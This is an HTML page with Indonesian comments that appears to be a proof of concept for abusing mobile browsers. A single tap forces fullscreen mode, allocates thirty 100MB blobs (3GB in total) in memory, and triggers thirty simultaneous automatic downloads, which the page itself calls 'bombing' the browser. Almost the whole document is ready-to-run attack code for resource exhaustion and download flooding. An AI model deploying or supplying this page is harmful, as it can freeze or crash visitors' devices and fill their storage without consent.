<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Auto Fullscreen & Race Multi-Download (30 Files x 100MB)</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      color: #222;
      padding: 20px;
    }
    .panel {
      background: #fff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      max-width: 650px;
      margin: 40px auto;
    }
    :fullscreen {
      background: #ffffff !important;
      padding: 20px !important;
      overflow-y: auto !important;
      width: 100vw !important;
      height: 100vh !important;
    }
    :-webkit-full-screen {
      background: #ffffff !important;
      padding: 20px !important;
      overflow-y: auto !important;
    }
    button {
      width: 100%;
      padding: 16px;
      cursor: pointer;
      border: 0;
      border-radius: 6px;
      background: #d32f2f; /* Mengubah warna ke merah sebagai penanda beban berat */
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      -webkit-tap-highlight-color: transparent;
    }
    #status { 
      margin-top: 16px; 
      font-weight: bold; 
      color: #1565c0; 
      padding: 10px;
      background: #e3f2fd;
      border-radius: 4px;
      display: inline-block;
      width: 100%;
      text-align: center;
    }
    #downloads {
      margin-top: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 10px;
    }
    #downloads a { 
      display: block; 
      padding: 8px;
      background: #ffebee;
      color: #c62828;
      text-decoration: none;
      border-radius: 4px;
      font-size: 13px;
      text-align: center;
      border: 1px solid #ffcdd2;
    }
  </style>
</head>

<body>
  <div class="panel" id="main-panel">
    <h2>Mobile Auto-Fullscreen & 30 Files x 100MB Download</h2>
    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh pada Android dan menembak 30 file (masing-masing 100MB, Total 3GB) secara paralel.</p>

    <p>
      <button id="start" type="button">Masuk Fullscreen & Unduh 30 File (3GB Total)</button>
    </p>

    <p id="status" role="status">Siap menjalankan pengujian beban berat.</p>
    <div id="downloads"></div>
  </div>

  <script>
    const start = document.getElementById("start");
    const status = document.getElementById("status");
    const downloads = document.getElementById("downloads");

    let objectUrls = [];

    // Fungsi Asinkronus untuk mempersiapkan Blob 100MB di Microtask Queue
    const prepareBlobAsync = (i) => {
      return new Promise((resolve) => {
        queueMicrotask(() => {
          // Ukuran 100 MB dalam Bytes (100 * 1024 * 1024)
          const sizeInBytes = 104857600; 
          
          // Menggunakan Uint8Array agar alokasi memori biner berjalan instan tanpa membekukan JS engine
          const dummyData = new Uint8Array(sizeInBytes); 
          
          const blob = new Blob([dummyData], { type: "application/octet-stream" });
          const url = URL.createObjectURL(blob);
          resolve({ id: i, url: url });
        });
      });
    };

    // Memicu download secara instan menggunakan Event Loop Macrotask
    const triggerInstantDownload = (fileData) => {
      setTimeout(() => {
        const link = document.createElement("a");
        link.href = fileData.url;
        link.download = `poc-100mb-${String(fileData.id).padStart(2, '0')}.bin`;
        link.textContent = `File ${fileData.id} (100MB)`;
        downloads.appendChild(link);

        link.click();
      }, 0);
    };

    start.addEventListener("click", () => {
      // PEMBERSIHAN MEMORI AGRESIF
      // Sangat penting untuk melepaskan URL lama agar RAM mobile tidak langsung penuh (OOM)
      objectUrls.forEach(url => URL.revokeObjectURL(url));
      objectUrls = [];
      downloads.replaceChildren();

      // 1. EKSEKUSI FULLSCREEN INSTAN
      const docEl = document.documentElement;
      try {
        if (docEl.requestFullscreen) {
          docEl.requestFullscreen();
        } else if (docEl.webkitRequestFullscreen) { 
          docEl.webkitRequestFullscreen();
        } else if (docEl.mozRequestFullScreen) { 
          docEl.mozRequestFullScreen();
        }
        status.textContent = "Auto Fullscreen Berhasil dipicu!";
      } catch (err) {
        console.warn(`Gagal masuk fullscreen: ${err.message}`);
      }

      // 2. SKENARIO RACE CONDITION BEBAN BERAT
      setTimeout(async () => {
        status.textContent = "Layar penuh aktif. Mengalokasikan 3GB memori di background...";

        const downloadPromises = [];
        for (let i = 1; i <= 30; i++) {
          downloadPromises.push(prepareBlobAsync(i));
        }

        // Menunggu seluruh 30 file siap di memori secara bersamaan
        const allFiles = await Promise.all(downloadPromises);
        
        status.textContent = "Membom browser dengan 30 unduhan sekaligus!";
        
        allFiles.forEach(fileData => {
          objectUrls.push(fileData.url);
          triggerInstantDownload(fileData);
        });
      }, 150); // Jeda dinaikkan sedikit menjadi 150ms demi stabilitas transisi grafik mobile
    });
  </script>
</body>
</html>
